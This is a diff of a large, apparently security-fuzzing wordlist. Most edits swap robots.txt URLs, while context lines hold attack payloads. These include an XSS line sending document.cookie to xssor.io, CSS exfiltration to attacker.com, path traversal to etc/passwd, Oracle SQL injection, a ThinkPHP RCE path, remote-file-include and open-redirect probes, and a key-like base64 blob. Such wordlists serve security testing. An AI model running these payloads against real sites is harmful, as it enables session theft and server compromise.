 http://this@$$t%$.issomerandom!@#$%^*()_.com
-http://thl.fi/robots.txt
-http://tillys.com/robots.txt
-http://tineye.com/robots.txt
-http://today.yougov.com/robots.txt
-http://tokstok.com.br/robots.txt
+http://thoughtco.com/robots.txt
+http://threads.net/robots.txt
+http://tilburguniversity.edu/robots.txt
+http://tinypic.com/robots.txt
+http://tiszaensemble.org/robots.txt
+http://tokyoartbeat.com/robots.txt
 http://tomi057.freeheberg.com/
+http://tookstookson.blogspot.com/robots.txt
+http://topics.nytimes.com/robots.txt
 http://tr2.kinozal.tv/announce
-http://trademe.co.nz/robots.txt
-http://trumpwhitehouse.archives.gov/robots.txt
-http://tumblr.com/robots.txt
-http://typescriptlang.org/robots.txt
-http://uk.wikipedia.org/robots.txt
-http://uneex.org/robots.txt
-http://upload.wikimedia.org/robots.txt
+http://tracks.arte.tv/robots.txt
+http://trade.gov/robots.txt
+http://travelchannel.com/robots.txt
+http://triberr.com/robots.txt
+http://tvguide.com/robots.txt
+http://u.pcloud.link/robots.txt
+http://uk.linkedin.com/robots.txt
+http://unive.it/robots.txt
+http://unpkg.com/robots.txt
+http://upwork.com/robots.txt
 http://upworthy.com/robots.txt
+http://uq.edu.au/robots.txt
 http://url.example.com/index.php/[relative_url_inserted_here]
-http://us.blackberry.com/robots.txt
-http://user-images.githubusercontent.com/robots.txt
-http://usnews.com/robots.txt
+http://usda.gov/robots.txt
+http://use.fontawesome.com/robots.txt
+http://uspto.gov/robots.txt
 http://ustream.tv/robots.txt
-http://uwm.edu/robots.txt
 http://v.youku.com/robots.txt
-http://validator.w3.org/robots.txt
-http://vcu.edu/robots.txt
+http://vam.ac.uk/robots.txt
+http://vi.wikipedia.org/robots.txt
 http://video.fc2.com/en/payment.
-http://videohive.net/robots.txt
-http://wa.me/robots.txt
-http://walls.io/robots.txt
-http://washingtonian.com/robots.txt
-http://waxy.org/robots.txt
-http://wayback.archive-it.org/robots.txt
-http://waymo.com/robots.txt
-http://wealthsimple.com/robots.txt
-http://weblio.jp/robots.txt
-http://weddingwire.com/robots.txt
-http://weforum.org/robots.txt
-http://wellbeing.google/robots.txt
-http://westelm.com/robots.txt
-http://westjet.com/robots.txt
-http://wetransfer.com/robots.txt
-http://whatwg.org/robots.txt
+http://vlaanderen.be/robots.txt
+http://volvogroup.com/robots.txt
+http://vox.com/robots.txt
+http://vu.nl/robots.txt
+http://w3techs.com/robots.txt
+http://webfoundation.org/robots.txt
+http://weebly.com/robots.txt
+http://wevideo.com/robots.txt
 http://whois.domaintools.com
 http://wiki.archlinux.org/robots.txt
-http://wiki.whatwg.org/robots.txt
-http://wildberries.ru/robots.txt
+http://wilson.com/robots.txt
+http://win.tue.nl/robots.txt
 http://winamp.com/robots.txt
-http://wired.com/robots.txt
+http://wish.com/robots.txt
+http://wolframalpha.com/robots.txt
+http://womansday.com/robots.txt
 http://wordpress.org/robots.txt
-http://wordstream.com/robots.txt
+http://workers.cloudflare.com/robots.txt
 http://worlddharma.com/robots.txt
-http://wsj.com/robots.txt
+http://wto.org/robots.txt
 http://www.000webhost.com/1030
 http://www.000webhost.com/1195
 http://www.000webhost.com/?id=
@@ -15898,26 +15904,20 @@ http://www.youtube.com/watch?v=p3wjx1ciuy4
 http://www.yozgat.org.tr/admin/
 http://www.yuwie.com/r/56779/
 http://www1.folha.uol.com.br/robots.txt
-http://xcelab.net/robots.txt
 http://xsearch.aetna.com
 http://xss.crowdshield.com
 http://xss.crowdshield.com/.testing/rfi_vuln.txt
 http://xss.crowdshield.com/.testing/rfi_vuln.txt%00
+http://xverse.app/robots.txt
 http://xy>.7d8t\205pzm@www.whitelisteddomain.tld+@localdomain.pw/
 http://xy>.7d8t\205pzm@www.whitelisteddomain.tld@localdomain.pw/
-http://yammer.com/robots.txt
-http://yandex.com/robots.txt
+http://yamaha.com/robots.txt
 http://yandex.ru
-http://yarnpkg.com/robots.txt
 http://yngwie.ru/2.mp4
 http://yngwie.ru?
-http://yotpo.com/robots.txt
-http://yt3.googleusercontent.com/robots.txt
-http://yui-net.com/robots.txt
-http://zhihu.com/robots.txt
-http://zillow.com/robots.txt
-http://zippia.com/robots.txt
-http://zsl.org/robots.txt
+http://youradchoices.com/robots.txt
+http://zapier.com/robots.txt
+http://zappos.com/robots.txt
 http_request2/0.3.0 (http://pear.php.net/package/http_request2) php/5.4.19
 http_request2/2.0.0rc1 (http://pear.php.net/package/http_request2) php/5.3.6
 http_request2/2.1.1 (http://pear.php.net/package/http_request2) php/5.3.10-1ubuntu3.8
@@ -15967,7 +15967,7 @@ https://google.com/%2f..
 https://google.com//
 https://help.commerce.campaignmonitor.com/s/login/?ec=302&starturl=%2fs%2fsfsites%2faura%3faura.component.reportfailedaction%3d2&r=2&ui-communities-components-aura-components-forcecommunity-richtext.richtext.getparsedrichtextvalue=2&ui-communities-components-aura-components-forcetopic-featuredtopicsdataprovider.featuredtopicsdataprovider.getfeaturedtopics=1
 https://id.fedoraproject.org/scope/groups
-https://image.shutterstock.com/image-photo/*.jpghttp://stocktwits.com/robots.txt
+https://image.shutterstock.com/image-photo/*.jpghttp://bursamalaysia.com/robots.txt
 https://internet-banking.dbs.com.sg/dbsobweb/pages/ob/pweb.html?pid=
 https://kmeacollege.ac.in/
 https://lizardstresser.su
@@ -16051,7 +16051,7 @@ https://www.lemondeinformatique.fr/membres
 https://www.lemondeinformatique.fr/mobile
 https://www.lemondeinformatique.fr/tag
 https://www.sbx.tikkie.me
-https://www.se.com/us/en/work/external/local/apc/http://warwick.ac.uk/robots.txt
+https://www.se.com/us/en/work/external/local/apc/http://bart.gov/robots.txt
 https://www.se.com/us/en/work/products/critical-power-cooling-and-racks/cerebro-thank-you/
 https://www.sn1persecurity.com/
 https://www.southampton.ac.uk/research/areas
@@ -16217,8 +16217,8 @@ ide\\5
 idon\\\'tknow
 ie\\1
 if not, see <http://www.gnu.org/licenses/>.
-iframes/http://ticketbud.com/robots.txt
 iframes/http://transparent.com/robots.txt
+iframes/http://whereby.com/robots.txt
 igdespyder (compatible; igde.ru; +http://igde.ru/doc/tech.html)
 iiitbot/1.1 (indian language web search engine; http://webkhoj.iiit.net; pvvpr at iiit dot ac dot in)
 ilial/nutch-0.9 (ilial&#44; inc. is a los angeles based internet startup company. for more information please visit http://www.ilial.com/crawler; http://www.ilial.com/crawler; crawl@ilial.com)
@@ -16233,12 +16233,12 @@ iltrovatore/1.2 (iltrovatore; http://www.iltrovatore.it/bot.html; bot@iltrovator
 image uploader: http://matrixtxri745dfw.onion/
 image/image%3a%2f%2f%2e%2e%252fetc%252fpasswd
 images/http://cpj.org/robots.txt
-images/http://pewtrusts.org/robots.txt
+images/http://fas.org/robots.txt
 images/sites/http://zen.yandex.ru/robots.txt
 images/twitter_cards/http://gasbuddy.com/robots.txt
 ime\\imesc5\\dicts\\pintlgbp\.imd;80
 img-;a&'\\oe97~l!rb+47uli)0paqe
-img/mpr-logo-footer.svghttp://fashionista.com/robots.txt
+img/mpr-logo-footer.svghttp://asu.edu/robots.txt
 img/mpr-logo-footer.svghttp://teespring.com/robots.txt
 img\\18
 impartner.htmlhttp://gia.edu/robots.txt
@@ -16251,24 +16251,24 @@ incywincy(http://www.look.com)
 incywincy(http://www.loopimprovements.com/robot.html)
 index.asp\\
 index.htmlhttp://authorize.net/robots.txt
-index.htmlhttp://google.com.hk/robots.txt
-index.php/*/media/oembedhttp://csis.org/robots.txt
+index.htmlhttp://eweek.com/robots.txt
 index.php/*/media/oembedhttp://ovhcloud.com/robots.txt
 index.php/*/media/oembedhttp://xnview.com/robots.txt
+index.php/*/media/oembedhttp://zimbio.com/robots.txt
 index.php/\
 index.php/\"><script><script>alert(document.cookie)</script><
-index.php/image-gallery*,*http://rockpapershotgun.com/robots.txt
+index.php/image-gallery*,*http://vegas.com/robots.txt
 index.php/search/global?*http://streamable.com/robots.txt
 index.php/user/loginhttp://mprnews.org/robots.txt
-index.php/user/loginhttp://teespring.com/robots.txt
-index.php/user/logout/http://cosmopolitan.com/robots.txt
-index.php/user/logout/http://fontawesome.com/robots.txt
-index.php/user/logout/http://legislation.gov.au/robots.txt
+index.php/user/loginhttp://sega.com/robots.txt
 index.php/user/logout/http://letsencrypt.org/robots.txt
+index.php/user/logout/http://manchestereveningnews.co.uk/robots.txt
 index.php/user/logout/http://pendleton-usa.com/robots.txt
-index.php/user/logout/http://phet.colorado.edu/robots.txt
+index.php/user/logout/http://s3.ap-south-1.amazonaws.com/robots.txt
 index.php/user/logout/http://stubhub.com/robots.txt
 index.php/user/logout/http://theaustralian.com.au/robots.txt
+index.php/user/logout/http://vm.tiktok.com/robots.txt
+index.php/user/logout/http://world.openfoodfacts.org/robots.txt
 index.php?chemin=..%2f..%2f..%2f..%2f..%2f..%2f..%2f%2fetc
 index.php?redirect=/\/evil.com
 index.php?redirect=/\/evil.com/
@@ -16277,10 +16277,10 @@ index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[
 indows\\syswow64\\mshtaex\.exe;60
 indows\\temp\\debug\.txt;60
 influencer/mrbeasthttp://match.com/robots.txt
-influencer/mrbeasthttp://r-project.org/robots.txt
+influencer/mrbeasthttp://mdpr.jp/robots.txt
+info/linkkatalog/http://justdial.com/robots.txt
 info/linkkatalog/http://telemundo.com/robots.txt
-info/linkkatalog/http://wnycstudios.org/robots.txt
-info/wp-includes/js/jquery/jquery-migrate.min.jshttp://foxsports.com/robots.txt
+info/wp-includes/js/jquery/jquery-migrate.min.jshttp://hangouts.google.com/robots.txt
 info@pubblisito.com- (http://www.pubblisito.com) il sud dei motori di ricerca
 infoconveracrawler/0.8 ( http://www.authoritativeweb.com/crawl)
 infofly/1.0 (http://www.versions-project.org/)
@@ -16296,8 +16296,8 @@ input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 input2.bat?|dir20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 input[value^="a"] { background-image: url('https://attacker.com/exfil?char=a'); }
 intelix/0.x (cs; http://www.microton.cz/intelix/; microton@@microton.cz)
-interactive*http://apis.google.com/robots.txt
-interactive*http://kinopoisk.ru/robots.txt
+interactive*http://fcc.gov/robots.txt
+interactive*http://missingkids.org/robots.txt
 interactive*http://scmp.com/robots.txt
 interactive*http://thetimes.co.uk/robots.txt
 intermittently from http://fuzine.mt.cs.cmu.edu/scout/home.html).
@@ -16314,7 +16314,7 @@ ioi/2.0 (isc open index crawler; http://index.isc.org/; bot@index.isc.org)
 ip2locationbot/1.0 &lt;a href="http://www.ip2location.com">http://www.ip2location.com&lt;/a>
 ip2mapbot/1.1 &lt;a href=http://www.ip2map.com
 ip2mapbot/1.1 &lt;a href=http://www.ip2map.com>http://www.ip2map.com&lt;/a>
-ipad/http://cncf.io/robots.txt
+ipad/http://ge.com/robots.txt
 ipc\\
 ipc\\1
 ipc\\2
@@ -16359,8 +16359,8 @@ isi\\01
 islam0-=\\
 issm\\1
 it's on <http://web.nexor.co.uk/mak/doc/robots/norobots.html>
-it/searchhttp://computerworld.com/robots.txt
 it/searchhttp://creativebloq.com/robots.txt
+it/searchhttp://realtor.com/robots.txt
 it\\\'s0220
 it\\\'sjenny
 it\\\'smylife531989
@@ -16381,7 +16381,6 @@ j\\u
 j^3{7we\\,q>lq#bjx/knh*7eownkj
 ja\\\\\\\'miyah12148
 ja_jp/images/*http://benzinga.com/robots.txt
-ja_jp/images/*http://fortawesome.github.io/robots.txt
 jabot/6.x (http://odin.ingrid.org/)
 jabot/7.x.x (http://odin.ingrid.org/)
 jambot/0.1.x (jambot; http://www.jambot.com/blog; crawler@jambot.com)
@@ -16455,7 +16454,6 @@ journster [alpha] (http://journster.com/)
 journster.com rss/atom aggregator 0.5 (http://www.journster.com/bot.phtml)
 jquery: https://jquery.com/
 js-parts.html$http://science.howstuffworks.com/robots.txt
-js-parts.html$http://taylorfrancis.com/robots.txt
 json/*http://focusonthefamily.com/robots.txt
 json/*http://traillink.com/robots.txt
 justine11\\\\2
@@ -16522,8 +16520,8 @@ kv^s5ywv,cfeswdp9=jf[bx\\6yz7qy
 kw%)(&\\\"
 l*'%[5znbe]?}>lndjl.^nf7gd^ms\\
 l-http://ahrefs.com/robots.txt
-l-http://icann.org/robots.txt
-l-http://namecheap.com/robots.txt
+l-http://inc.com/robots.txt
+l-http://popsci.com/robots.txt
 l-http://w3c.github.io/robots.txt
 l.webis/0.87 (http://webalgo.iit.cnr.it/index.php?pg=lwebis)
 l4dzq7/zi)''k^@]#crtb''dlozkt\\rz
@@ -16571,11 +16569,11 @@ lawinfo-crawler/nutch-0.9-dev (crawler for lawinfo.com pages; http://www.lawinfo
 lawrence amer https://facebook.com/lawrence.aamor
 lbw19841216\\\
 ldspider (http://code.google.com/p/ldspider/wiki/robots)
-le-corner-partenaires/http://correios.com.br/robots.txt
 le-corner-partenaires/http://lu.ma/robots.txt
+le-corner-partenaires/http://townhall.com/robots.txt
 learning-hub/http://goop.com/robots.txt
 legal/http://maps.google.de/robots.txt
-legal/http://qvc.com/robots.txt
+legal/http://wcpo.com/robots.txt
 legion (https://govanguard.io)
 lehre\\1
 lehre\\3
@@ -16656,16 +16654,16 @@ litsun\\2
 litsun\\8
 litsun\\9
 live-score/cricket/widgets/livescorebook?*http://eeas.europa.eu/robots.txt
-live-timing/widget/*http://acronymfinder.com/robots.txt
 live-timing/widget/*http://albawaba.com/robots.txt
+live-timing/widget/*http://mobile.nytimes.com/robots.txt
 livemore/vl/http://computerhope.com/robots.txt
 livetrans/nutch-0.9 (maintainer: cobain at iis dot sinica dot edu dot tw; http://wkd.iis.sinica.edu.tw/livetrans/)
 lk-hp-\\0
 lk-hp-\\1
 llaut/1.0 (http://mnm.uib.es/~gallir/llaut/bot.html)
-llms.txthttp://abb.com/robots.txt
-llms.txthttp://cfda.com/robots.txt
-llms.txthttp://expressen.se/robots.txt
+llms.txthttp://blood.ca/robots.txt
+llms.txthttp://gaana.com/robots.txt
+llms.txthttp://my.bluehost.com/robots.txt
 lng=http://www.evil.com/getdata.php
 lns\\2
 loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
@@ -16682,14 +16680,14 @@ loki\\3
 look at http://rd.cs.colorado.edu/harvest/.  such a system is under
 lord\\\'s1000
 lovel as 1.0 ( +http://www.everatom.com)
+lp/*http://anandtech.com/robots.txt
 lp/*http://bestlifeonline.com/robots.txt
-lp/*http://hotspotshield.com/robots.txt
+lp/http://embed.ly/robots.txt
 lp/http://onepeloton.com/robots.txt
-lp/http://tsa.gov/robots.txt
 lp@%xqb8zc\\cddw4<;
 lpd76>\\xunt<cq.",-hbi7p2odde,a
 ls/docshttp://downforeveryoneorjustme.com/robots.txt
-ls/docshttp://ratp.fr/robots.txt
+ls/docshttp://nbcnewyork.com/robots.txt
 lti/lemurproject nutch spider/nutch-1.0-dev (lti crawler for cmu; http://www.lti.cs.cmu.edu; changkuk at cmu dot edu)
 lti/lemurproject nutch spider/nutch-1.0-dev (research spider using nutch; http://www.lemurproject.org; mhoy@cs.cmu.edu)
 ltisun\\0
@@ -16752,7 +16750,7 @@ mahogany\\5
 mahogany\\9
 main.asp\\
 mainmean\\'sgirl
-maintenance.htmlhttp://tagesanzeiger.ch/robots.txt
+maintenance.htmlhttp://rbb-online.de/robots.txt
 maintenance.htmlhttp://unive.it/robots.txt
 makoto\\'sbestfr
 makoto\\'sfriend
@@ -16762,8 +16760,8 @@ manage-email-subscriptionhttp://kooapp.com/robots.txt
 mandarin/search/\?query=.
 manikandan rajakumar https://twitter.com/mani22cars
 mantis/summary_graph_functions.php?g_jpgraph_path=http%3a%2f%2fattackershost%2flistings.txt%3f
+manual243/http://hannover.de/robots.txt
 manual243/http://jcp.org/robots.txt
-manual243/http://wordnik.com/robots.txt
 mapoftheinternet.com ( http://mapoftheinternet.com)
 marianic technology services: http://mts7hqqqeogujc5e.onion/
 marketing_campaigns/http://trivago.com/robots.txt
@@ -16850,10 +16848,10 @@ mechanize/2.7.4 ruby/2.2.5p319 (http://github.com/sparklemotion/mechanize/)
 mechanize/2.7.5 ruby/2.4.1p111 (http://github.com/sparklemotion/mechanize/)
 mechanize/2.7.5 ruby/2.4.2p198 (http://github.com/sparklemotion/mechanize/)
 media/*.pdfhttp://lsa.umich.edu/robots.txt
+media/http://archive.fo/robots.txt
 media/http://newspapers.com/robots.txt
-media/http://umt.edu/robots.txt
 media/resized-images/*http://americorps.gov/robots.txt
-media/resized-images/*http://pandas.pydata.org/robots.txt
+media/resized-images/*http://icpsr.umich.edu/robots.txt
 media/smartphones/$http://africanews.com/robots.txt
 media/smartphones/$http://interserver.net/robots.txt
 media\\3
@@ -16883,7 +16881,7 @@ mgp9yqo1zxt]~fj_jjn\\x\\b;>2c,eg
 mhtml:http://html5sec.org/test.html!xss.htmlmhtml:http://html5sec.org/test.gif!xss.html
 mickeyd\\\'s
 micro_page.phphttp://dash.harvard.edu/robots.txt
-micro_page.phphttp://kiwi.com/robots.txt
+micro_page.phphttp://joblo.com/robots.txt
 microsoft live labs zoom.it <http://zoom.it/> (via wayback save page)
 miieogibaakcaqeamreslv5amledwfcyqd0sxlqqmsqb4gvf6iaebprmjuk0zzu8\nya0t/y2eqrjmf2q/d9qital1bdh/vumyszaiwfvs/hsizlst+3w+kzetyhrcj+4f\njlo5tkqqfdjp6s75jncxzzdgyh5ynpm/1oosnguldolz41vhojfpuiuzmvshmz3i\ngbsotmuql4dreiaj4ydmhlz4qkpfowvxqao+2ovwfwocxxaefaheap2wzmvk6xrt\nnhvjgql1qonefqjaie906bcthtobcpy5xx2lhablol65/gmyv1txv8mkxlega8px\nho5d2zxlz2aucbdgo1o4d24wdizxskkhznzzgqidaqabaoibahjnx5gderofazsp\nhdp2xe3xyrbbdwvmjewjobpmpux75z6islkg19+m4o7dtvl9inhrh8uuk5uum82y\n+9sugs1w6qkyt6jygfxb+wgjknnpsigosh5230hq9yrfizoqigkw1jatqm63hcsa\ntccffhe2r4gxpbzo1f/j4qap8qnc4fkgu0rgrztf7tckanii5mh4il+2ezgcwxhj\nhed0is0eli4mvdd+mrg0feeevlm3/mla8px1h8ikhh1uoyfxeqayfj4amc5u08uc\nk6l/l+xw5eowlokonbicdekixejc7vk5sybqt1o0xapsygap3y3fbdf4dfjzjgp3\na+dingecgyeazdwxz7qg6mj9gfcoiqja4g+flvszus6q0vmdh3rqtyekl7pc3b80\nykn9wsf0hsrktrv1tjny4o5u+xwg1n2avv7p4tp4sx/jmjildmwctffzgdvq5z6d\nsz2g1tvyatx/b/br44febuq1gtpsqcb+btl14l+kqahbbqkxq/tho1ecgyeawf5r\nsqpppxchq33uz3ef6dngfa/aj4f1giwriadbclp8ew4gvxbh2+duyes01z2pl4xf\nhzrjjnxz5onszdccl7vd2u+yose7+zf3te/cbw5ujr8lhpnize3o/lbhwnojf81o\nqaj6dfjf9pw/wvhwjg4sk8pf2mozt6j9wmf0l0kcgyai+sdqv6zvkahzn9ahda9l\ne5j46buqdo2qbsxcsovvugjugdat10+pzamo6deri7i5dychqpzcm7zu7m47bbhc\nfua9hthrs0tkdocqjgnq1jw6ae/9wyzwh9hmqg6b0yvcrq37eoarwnbs9+fcben3\nknv1njba9xfo2zfy1d8yaqkbgahajubokxwrxzejw53hwhnnrjqq2alifvcoego/\n2pz30ap+6/lgppp5/lgaqt6vsieku1sipuqo8fii061bro+zgbykhsvefsw/cvsi\nhw8d89n3razqsdbdbmyqcjabsuu2xhuvwpcxf5hvmux0rekt25ruvkputpddimzz\nz+j5aogaofqzw/tpd0l/rciy0gvl93w50mhecu8butmy3a1ovsf2j8c5sfxnsgy/\nyhygfe5zluvy1g6xoyovjcpi4mfacwyw9ztmk8zr6b/m9igf+royxnbq0xbmrtyo\n3pwud4kboyveefcl/utmrxywzalhrvzubadggjnt8ppxktan01o=
 mike tigas: http://tigas3l7uusztiqu.onion/
@@ -19259,15 +19257,15 @@ mpii0\2\\7
 mpii0\2\\9
 mpii0\\999
 mqbot/nutch-0.9-dev (mqbot nutch crawler; http://falcon.cs.uiuc.edu; mqbot@cs.uiuc.edu)
-mre/*.zip$http://modernbluesharmonica.com/robots.txt
+mre/*.zip$http://gov.uk/robots.txt
+mre/*.zip$http://reconstructingjudaism.org/robots.txt
 mre/*.zip$http://sintradaytrips.com/robots.txt
 mre/*.zip$http://support.zendesk.com/robots.txt
-mre/*.zip$http://thehackernews.com/robots.txt
 ms\\0
 ms\\2
 ms\\286
 msatwork/uber/en.htmlhttp://accessnow.org/robots.txt
-msatwork/uber/en.htmlhttp://mediawiki.org/robots.txt
+msatwork/uber/en.htmlhttp://tate.org.uk/robots.txt
 msie 20.0 (+http://www.google.com/bot.html)
 msn/1.0 (+http://search.msn.com/msnbot.htm)
 msnbot-media/1.0 (+http://search.msn.com/msnbot.htm)
@@ -19303,9 +19301,9 @@ mumia\\\'124
 munin*http://academia.edu/robots.txt
 munin*http://images.google.com/robots.txt
 munin*http://lenovo.com/robots.txt
+munin*http://lexisnexis.com/robots.txt
 munin*http://mamaworkout.de/robots.txt
 munin*http://melon.com/robots.txt
-munin*http://mygov.in/robots.txt
 munin*http://quintetoinvento.com/robots.txt
 munin.torproject.org: http://hhr6fex2giwmolct.onion/
 munna\\\'s
@@ -19314,10 +19312,12 @@ music downloads: http://wuvdsbmbwyjzsgei.onion/
 musicwalker2.0 ( http://www.somusical.com)
 mv\\600
 mv\\800
-mvscripts/http://americanmilitarynews.com/robots.txt
+mvscripts/http://thinglink.com/robots.txt
 mvyns4qi\{omf(j!aja^\\[;bi8k2*p`
+my-account/http://justapinch.com/robots.txt
 my-account/http://mobile.abc.net.au/robots.txt
 my/blog/driver/struktur-pendapatan-mingguan-grabcar-economy-muar-http://brainpickings.org/robots.txt
+my/blog/driver/struktur-pendapatan-mingguan-grabcar-economy-muar-http://nsw.gov.au/robots.txt
 my\\$ecreetkey@123
 my\\3
 my\\6
@@ -19339,11 +19339,10 @@ n\\3
 n\\54
 n\\\70a
 n^b_u&b|xfby1wgdfq\\ua%
-na3yw0http://thenation.com/robots.txt
+na3yw0http://pfizer.com/robots.txt
 naamah 1.0.1/blogbot (http://blogbot.de/)
 naamah 1.0a/blogbot (http://blogbot.de/)
 nagios.torproject.org: http://kakxayzmcc3zeomu.onion/
-name-your-airstreamshttp://verywellfit.com/robots.txt
 nasa\\
 nasa\\1
 nasa\\2
@@ -19352,7 +19351,6 @@ nasa\\4
 nasa\\5
 nason1\\1
 natol/http://openjsf.org/robots.txt
-natol/http://printmag.com/robots.txt
 navissobot/1.7  (+http://navisso.com/)
 nbrwh\\7
 nbrwh\\9
@@ -19371,12 +19369,12 @@ netseer/nutch-0.9 (netseer crawler; http://www.netseer.com; crawler@netseer.com)
 netwhatcrawler/0.06-dev (netwhatcrawler from netwhat.com; http://www.netwhat.com; support@netwhat.com)
 new image().src="http://xssor.io/phishing/cookie.asp?cookie="+escape(document.cookie);
 new/\/new/golf-plus
-news.host.html/content/shared/university/news/ub-reporter-articles/stories/2024/10/nsf-engines.detail.htmlhttp://leica-geosystems.com/robots.txt
+news.host.html/content/shared/university/news/ub-reporter-articles/stories/2024/10/nsf-engines.detail.htmlhttp://boxofficemojo.com/robots.txt
 news/archive/all-news.cfmhttp://yourwebsite.com/robots.txt
-news/articles/*.xml$http://docsend.com/robots.txt
 news/articles/*.xml$http://globaltimes.cn/robots.txt
+news/articles/*.xml$http://oscars.org/robots.txt
 news/newsletters/*http://zerodayinitiative.com/robots.txt
-news?*http://fender.com/robots.txt
+news?*http://nextjs.org/robots.txt
 news?*http://thecut.com/robots.txt
 newsgator fetchlinks extension/0.2.0 (http://graemef.com)
 newsgator/2.0 bot (http://www.newsgator.com)
@@ -19384,11 +19382,12 @@ newsgator/2.5 (http://www.newsgator.com; microsoft windows nt 5.1.2600.0; .net c
 newsgatoronline/2.0 (http://www.newsgator.com; 1 subscribers)
 newsletter-master.torproject.org: http://wuxx5wlnezbkohsp.onion/
 newsletter.torproject.org: http://kzcx36ytbsm5iogs.onion/
-newsletter/$http://foodnavigator-usa.com/robots.txt
+newsletter/$http://graphql.org/robots.txt
 newsletter/$http://writersdigest.com/robots.txt
 newsletters/subscribe/*http://amctheatres.com/robots.txt
 newsletters/subscribe/*http://datacenterdynamics.com/robots.txt
-next/http://revlomian.blogspot.com/robots.txt
+newyork/http://getrichslowly.org/robots.txt
+next/http://sexlive.ltd/robots.txt
 next\\
 next\\0
 next\\00
@@ -19454,8 +19453,8 @@ no\\8sun
 no\\su
 noah wilcox http://craterdesigns.com
 node.js: https://nodejs.org/
+node/http://arabnews.com/robots.txt
 node/http://local12.com/robots.txt
-node/http://moomin.com/robots.txt
 nokia http://forum.nokia.com
 nokia2700c-2/2.0 (09.98) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 (compatible; googlebot/2.1; +http://www.google.com/bot.html)/ucweb8.2.0.116/69/352 untrusted/1.0
 nokia2700c-2/2.0 (09.98) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 (iphone; u; cpu iphone 0s 3.0 like mac 0s x; en-us; compatible; googlebot/2.1; http://www.google.com/bot.html; applewebkit/528.18(khtml,like gecko) version/4.0 mobile/7a341 safari/528.16/ucweb8.2.0.116/69/352 untrusted/1.0
@@ -19477,7 +19476,7 @@ northstar\\8
 northstar\\9
 note/read/http://openaccess.thecvf.com/robots.txt
 notebin: http://notestjxctkwbk6z.onion/
-notification/pressrelease/2012/00_honsha/1213_01_02.pdfhttp://pf.kakao.com/robots.txt
+notification/pressrelease/2012/00_honsha/1213_01_02.pdfhttp://channel9.msdn.com/robots.txt
 notifixious/linkchecker (http://notifixio.us)
 np'\\e)d$|]n\{/zw+\{op0'w'\\wujx]*
 np/0.1 (np; http://www.nameprotect.com; npbot@nameprotect.com)
@@ -19523,7 +19522,7 @@ nx\\9
 nxs"^\\y7v3c'[3od/'m
 nymesis/1.0 (http://nymesis.com)
 nyx.torproject.org: http://ebxqgaz3dwywcoxl.onion/
-nz/donateapi*http://judicialwatch.org/robots.txt
+nz/donateapi*http://unwto.org/robots.txt
 n|`2"]z!a7h+!j\\<bszbw7phu%fkhh
 o!ma\\w(vi8
 o+i4m/\{zs%rn@#.o\\"ogni1;l",huc
@@ -19557,8 +19556,8 @@ o\\\\\\\rourke
 o\\b
 o\{.pit8e(lrx[\\gpzew56fh,w>
 o_d-m\\0p{,gkld''ck/h$l&"
-oag/secure-pdf/http://assetstore.unity.com/robots.txt
-oag/secure-pdf/http://skfb.ly/robots.txt
+oag/secure-pdf/http://duden.de/robots.txt
+oag/secure-pdf/http://jsonline.com/robots.txt
 oak\\
 oak\\6
 oak\\7
@@ -19568,8 +19567,9 @@ oamyj494\\\\
 oauth-public/http://listal.com/robots.txt
 oauth-public/http://zhuanlan.zhihu.com/robots.txt
 oauth/http://designboom.com/robots.txt
-oauth/http://khaleejtimes.com/robots.txt
+oauth/http://pusheen.com/robots.txt
 oauth/http://reseau-canope.fr/robots.txt
+oauth/http://towardsdatascience.com/robots.txt
 objectssearch/0.01-dev (objectssearch;http://www.objectssearch.com/bot.html; support@thesoftwareobjects.com)
 objectssearch/0.0x (objectssearch; http://www.objectssearch.com/bot.html; support@thesoftwareobjects.com)
 oc/http://ellentube.com/robots.txt
@@ -19577,13 +19577,13 @@ oc/http://xyz.com/robots.txt
 ocelli/1.x (http://www.globalspec.com/ocelli)
 ocs\\username
 oeayf-nwihx\{to\\huwcd*x`us<ib,p
+ofertas-regalos/http://amazon.nl/robots.txt
 ofertas-regalos/http://beebom.com/robots.txt
-ofertas-regalos/http://jamf.com/robots.txt
 offline/http://books.google.co.uk/robots.txt
-offline/http://wiwo.de/robots.txt
+offline/http://jpmorgan.com/robots.txt
 ohnm)e#ll7tp0d<y\\ui}953?3ymxwi
 ohzon\\\\
-okanagan/itservices/service-catalogue/accounts/novell/imanager.htmlhttp://setn.com/robots.txt
+okanagan/itservices/service-catalogue/accounts/novell/imanager.htmlhttp://tbsnews.net/robots.txt
 old man fixer'92s fixing services: http://yth5q7zdmqlycbcz.onion/
 oldsite\\css
 oldsite\\images
@@ -19644,10 +19644,10 @@ opera/9.80 (windows nt 6.2; win64; x64) presto/2.12.388 version/12.15 at 91.237.
 opera/9.80 (windows nt 6.2; win64; x64) presto/2.12.388 version/12.15 at 95.211.10.3 using colorblind simulator at http://colorfilter.wickline.org/
 opera/9.80 (windows nt 6.2; wow64) presto/2.12.388 version/12.16 appengine-google; (+http://code.google.com/appengine; appid: s~revintec1)
 operpost$http://colorado.gov/robots.txt
-operpost$http://dai.ly/robots.txt
+operpost$http://obamawhitehouse.archives.gov/robots.txt
 opt-out/http://c-span.org/robots.txt
+opt-out/http://care.com/robots.txt
 opt-out/http://legislation.gov.uk/robots.txt
-opt-out/http://sentry.io/robots.txt
 opt-out/http://usa.visa.com/robots.txt
 or 1337=dbms_pipe.receive_message((\\'a\\'),120)
 or 1337=dbms_pipe.receive_message((\\'a\\'),120) --
@@ -19656,11 +19656,11 @@ or \\'xyz\\'=\\'xyz\\' --
 orbiter (+http://www.dailyorbit.com/bot.htm)
 orbiter/t-2.0 (+http://www.dailyorbit.com/bot.htm)
 orca browser (http://www.orcabrowser.com)
-order/heat-pump/my-quote/?http://ucanr.edu/robots.txt
+order/heat-pump/my-quote/?http://techinsider.io/robots.txt
 orlando/tag/*http://images.unsplash.com/robots.txt
 orlando/tag/*http://make.com/robots.txt
 osiris storage: http://tk4chjqopurvzmiu.onion/
-out/http://jumpsport.com/robots.txt
+out/http://haikudeck.com/robots.txt
 out/http://tbsnews.net/robots.txt
 outclicksbot/2 +https://www.outclicks.net/agent/7svollgkamkvjqclcbi5eunmn1zgwm2wjuxpmckkpgy
